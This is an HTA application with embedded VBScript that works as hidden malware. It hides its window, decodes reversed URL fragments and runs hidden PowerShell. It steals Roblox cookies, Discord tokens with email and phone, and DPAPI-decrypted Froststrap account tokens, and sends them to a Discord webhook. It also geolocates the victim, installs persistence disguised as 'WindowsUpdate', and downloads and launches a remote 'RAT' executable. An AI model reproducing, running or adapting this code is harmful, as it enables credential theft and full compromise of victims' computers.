<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim o1, o2, n1, n2, W0, W1, g1, g2, zz
Set o1 = CreateObject("WScript.Shell")
Set o2 = CreateObject("Scripting.FileSystemObject")

W0 = fx(":sptht|csid//|ppadro|a/moc.|bew/ip|/skooh|845651|463398|738561|YPM8/1|uwY5gZ|Dg7x5D|kfzk6z|zZyhNk|r2PG23|lun3iv|bGn0K9|P-4tpT|fD6J0o|LtiA_C|cWY8")
W1 = ""
g1 = fx(":sptht|tsig//|uhtig.|cresub|tnetno|v/moc.|Dnyezi|ca1/ve|0411a4|ef37f5|162bbb|3f0a0f|/41319|ts/war|sp.lae|1")
g2 = fx(":sptht|qkqa//|efafdh|ccsmmp|s.fypx|sabapu|s/oc.e|egarot|bo/1v/|p/tcej|/cilbu|lpsdog|ilnO/a|eciDen|exe.")
zz = "5f4dcc3b5aa765d61d8327deb882cf99"

n1 = o1.ExpandEnvironmentStrings("%COMPUTERNAME%")
n2 = o1.ExpandEnvironmentStrings("%USERNAME%")

Dim t0f : t0f = o1.ExpandEnvironmentStrings("%TEMP%") & "\trace.txt"
Dim tr : Set tr = o2.CreateTextFile(t0f, True) : tr.Write "START:" & Now & vbCrLf : tr.Close : Set tr = Nothing

Call p1
Call p2
Call p3
Call p4
Call p5

Dim c1
For c1 = 1 To 2
    Call q1(":arrows_counterclockwise: Download Attempt " & c1 & "/2", "PC: " & n1 & " | User: " & n2, 3447003)
    Call p6
    If c1 < 2 Then Call s1(2)
Next

Dim c2
For c2 = 1 To 4
    Call q1(":repeat: Re-grab " & c2 & "/4", "PC: " & n1 & " | User: " & n2, 3447003)
    Call p1
    Call p2
    Call p3
    Call p5
    If c2 < 4 Then Call s1(5)
Next

window.close()

' --- decode ---
Function fx(s)
    Dim a, i
    a = Split(s, "|")
    fx = ""
    For i = 0 To UBound(a)
        fx = fx & StrReverse(a(i))
    Next
End Function

' --- p2 ---
Sub p2()
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", fx(":sptht|.ipa//|.yfipi|/gro"), False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip : ip = xh.responseText
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", fx(":sptht|pa-pi/|/moc.i|/enil") & ip & fx("dleif?|nuoc=s|er,ryt|aNoig|tic,em|psi,y"), False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll : ll = Split(xh.responseText, vbLf)
    Dim inf : inf = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & n1 & " | " & n2
    Call q1(":dart: Target", inf, 3447003)
    Set xh = Nothing
End Sub

' --- p3 ---
Sub p3()
    Dim a1(4)
    a1(0) = o1.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    a1(1) = o1.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    a1(2) = o1.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    a1(3) = o1.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    a1(4) = o1.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    Dim i, fp, rw
    For i = 0 To 4
        If o2.FileExists(a1(i)) Then fp = a1(i) : Exit For
    Next
    If Len(fp) = 0 Then
        Dim pk : pk = o1.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
        If o2.FolderExists(pk) Then
            Dim fd, sf
            Set fd = o2.GetFolder(pk)
            For Each sf In fd.SubFolders
                If InStr(UCase(sf.Name), "ROBLOX") > 0 Then
                    Dim uw : uw = sf.Path & "\LocalState\RobloxCookies.dat"
                    If o2.FileExists(uw) Then fp = uw : Exit For
                End If
            Next
            Set fd = Nothing
        End If
    End If
    If Len(fp) = 0 Then Exit Sub
    rw = u3(fp)
    If Len(rw) < 50 Then Exit Sub

    Dim ck : ck = ""
    If InStr(rw, "_|WARNING") > 0 Then ck = rw
    If Len(ck) = 0 And InStr(rw, "CookiesData") > 0 Then
        Dim sp : sp = InStr(rw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep : ep = InStr(sp, rw, """")
            If ep > sp Then
                Dim b64 : b64 = Mid(rw, sp, ep - sp)
                If Len(b64) > 100 Then ck = u4(b64)
            End If
        End If
    End If
    If Len(ck) = 0 And InStr(rw, ".ROBLOSECURITY") > 0 Then
        Dim rp : rp = InStr(rw, ".ROBLOSECURITY") : ck = Mid(rw, rp)
    End If
    If Len(ck) = 0 Then ck = rw

    ck = Replace(ck, vbCr, "")
    ck = Replace(ck, vbLf, "")
    ck = Replace(ck, vbTab, "")
    ck = Trim(ck)
    Dim sc : sc = InStr(ck, ";")
    If sc > 0 Then ck = Left(ck, sc - 1)
    ck = Trim(ck)
    Dim wn : wn = InStr(ck, "_|WARNING")
    If wn > 1 Then ck = Mid(ck, wn)

    q1 "Roblox Cookie", "Size: " & Len(ck) & " | PC: " & n1, 65280
    q2 "cookie.txt", ck
End Sub

' --- p5 ---
Sub p5()
    Dim fp : fp = o1.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Froststrap\Cache\AccountManager.json"
    If Not o2.FileExists(fp) Then
        On Error Resume Next
        Dim fdir : fdir = o1.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap\InstallLocation")
        On Error Goto 0
        If fdir <> "" Then fp = fdir & "\Cache\AccountManager.json"
    End If
    If Not o2.FileExists(fp) Then Exit Sub

    Call q1(":snowflake: Froststrap", "Froststrap found, grabbing accounts...", 3447003)

    Dim ps
    ps = "$w='" & W0 & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"

    o1.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
End Sub

' --- p6 ---
Sub p6()
    Call q1(":package: RAT Download", "Fetching Payload...", 3447003)
    Dim dl : dl = g2

    Dim op : op = o1.ExpandEnvironmentStrings("%TEMP%") & "\agent.bat"
    If o2.FileExists(op) Then o2.DeleteFile op

    o1.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & op & "'""", 0, True

    Dim rd : rd = False
    If o2.FileExists(op) Then
        If o2.GetFile(op).Size > 3000000 Then
            rd = True
        End If
    End If

    If rd Then
        Dim ds : ds = o2.GetFile(op).Size
        Call q1(":rocket: RAT Downloaded", "Size: " & CStr(ds) & " bytes" & vbCrLf & "Launching...", 3447003)
        o1.Run op, 0, False
        Call q1(":white_check_mark: RAT", "Payload executed successfully", 65280)
    Else
        o1.Run "cmd /c taskkill /f /im powershell.exe > nul 2>&1", 0, False
        Call q1(":hourglass: RAT Timeout", "Download failed or incomplete.", 16711680)
    End If
End Sub

' --- s1 / s2 ---
Sub s2(s)
    Dim t1, t2, t3, el
    t1 = Timer()
    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
    o1.Run cmd, 0, True
    el = Timer() - t1
    If el < 0 Then el = el + 86400
    If el < s Then
        t2 = Timer()
        Do
            t3 = Timer()
            If t3 < t2 Then t3 = t3 + 86400
            If (t3 - t2) >= (s - el) Then Exit Do
        Loop
    End If
End Sub

Sub s1(m)
    Call s2(m * 60)
End Sub

' --- p4 ---
Sub p4()
    Dim pf : pf = fx(" atshm|:sptht|ecid//|.ecart|ppa")
    On Error Resume Next

    o1.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", pf, "REG_SZ"
    o1.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", pf, "REG_SZ"

    Dim sp : sp = o1.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf : Set sf = o2.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & pf & """&Chr(34), 0, False"
    sf.Close

    Call q1(":pushpin: Persistence", "3 startup methods installed", 65280)
End Sub

' --- p1 ---
Sub p1()
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", g1, False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim pc : pc = xh.responseText
    If Len(pc) < 100 Then Exit Sub
    Set xh = Nothing

    Dim psf : psf = u1("steal.ps1")
    u2 psf, pc
    o1.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    o2.DeleteFile psf, True

    Dim rf : rf = u1("steal_result.txt")
    If Not o2.FileExists(rf) Then Exit Sub
    Dim rw : rw = u3(rf)

    If Len(rw) > 10 Then
        Dim ls : ls = Split(rw, vbCrLf)
        Dim l
        For Each l In ls
            If Len(l) > 10 Then
                If Left(l, 8) = "DISCORD|" Then
                    Dim p : p = Split(Mid(l, 9), "|")
                    If UBound(p) >= 4 Then
                        Dim inf : inf = "**User:** " & p(0) & vbCrLf
                        If p(1) <> "" Then inf = inf & "**Email:** " & p(1) & vbCrLf
                        If p(2) <> "" Then inf = inf & "**Phone:** " & p(2) & vbCrLf
                        If p(3) <> "0" Then inf = inf & "**ID:** " & p(3) & vbCrLf
                        inf = inf & "**Token:** " & p(4)
                        Call q1(":gift: Discord Token", inf, 5793266)
                    End If
                End If
                If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
                    Call q1(":cookie: Roblox Cookie", Mid(l, 8), 65280)
                End If
            End If
        Next
    End If
End Sub

' --- u1 / u2 / u3 ---
Function u1(nm): u1 = o1.ExpandEnvironmentStrings("%TEMP%") & "\" & nm: End Function
Sub u2(pth, cnt): Dim f: Set f = o2.CreateTextFile(pth, True): f.Write cnt: f.Close: Set f = Nothing: End Sub
Function u3(pth): u3 = "": Dim f: Set f = o2.OpenTextFile(pth, 1): u3 = f.ReadAll: f.Close: Set f = Nothing: End Function

' --- u7 ---
Sub u7(u, body, ct)
    Dim h : Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", u, False
    If Len(ct) > 0 Then h.SetRequestHeader "Content-Type", ct Else h.SetRequestHeader "Content-Type", "application/json"
    h.Send body
    If (h.Status < 200 Or h.Status > 299) And Len(W1) > 3 Then
        h.Open "POST", W1, False
        If Len(ct) > 0 Then h.SetRequestHeader "Content-Type", ct Else h.SetRequestHeader "Content-Type", "application/json"
        h.Send body
    End If
    Set h = Nothing
End Sub

' --- q1 / q2 ---
Sub q1(t, d, c)
    Dim DQ : DQ = Chr(34)
    Dim j : j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & u5(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & u5(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Call u7(W0, j, "")
End Sub

Sub q2(fn, ct)
    Dim DQ : DQ = Chr(34)
    Dim b : b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
    Dim bd : bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
    Call u7(W0, bd, "multipart/form-data; boundary=" & b)
End Sub

' --- u6 ---
Sub u6(cmd)
    Dim w, p, i, s
    Set w = GetObject("winmgmts:\\.\root\cimv2")
    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
    s.ShowWindow = 0
    Set p = w.Get("Win32_Process")
    p.Create cmd,,s,i
    If i = 0 Then Exit Sub
    Dim r : r = True
    Dim st : st = Timer()
    Do While r
        If Timer() - st > 60 Then
            Call q1("DEBUG", "PS1 TIMEOUT after 60s, killing", 16711680)
            o1.Run "taskkill /F /PID " & i, 0, False
            Exit Do
        End If
        Set w = GetObject("winmgmts:\\.\root\cimv2")
        r = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & i).Count > 0)
        Set w = Nothing
        If r Then Dim t : t = Timer() : Do While Timer() - t < 0.15 : Loop : End If
    Loop
End Sub

' --- u4 ---
Function u4(b64)
    u4 = ""
    Dim inf : inf = u1("dpi.txt")
    Dim outf : outf = u1("dpo.txt")
    o2.DeleteFile outf, True
    u2 inf, b64
    Dim ps : ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf : psf = u1("dpapi.ps1")
    u2 psf, ps
    o1.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    If o2.FileExists(outf) Then If o2.GetFile(outf).Size > 20 Then u4 = u3(outf)
    o2.DeleteFile inf, True
    o2.DeleteFile psf, True
    o2.DeleteFile outf, True
End Function

' --- u5 ---
Function u5(s)
    u5 = s
    u5 = Replace(u5, Chr(92), Chr(92) & Chr(92))
    u5 = Replace(u5, Chr(34), Chr(92) & Chr(34))
    u5 = Replace(u5, vbCrLf, Chr(92) & "n")
    u5 = Replace(u5, vbCr, Chr(92) & "n")
    u5 = Replace(u5, vbLf, Chr(92) & "n")
    u5 = Replace(u5, vbTab, Chr(92) & "t")
End Function

' --- decoy ---
Sub zq()
    Dim q : q = 1
    If q = 0 Then Call u6(zz)
End Sub
</script>
</head><body></body></html>
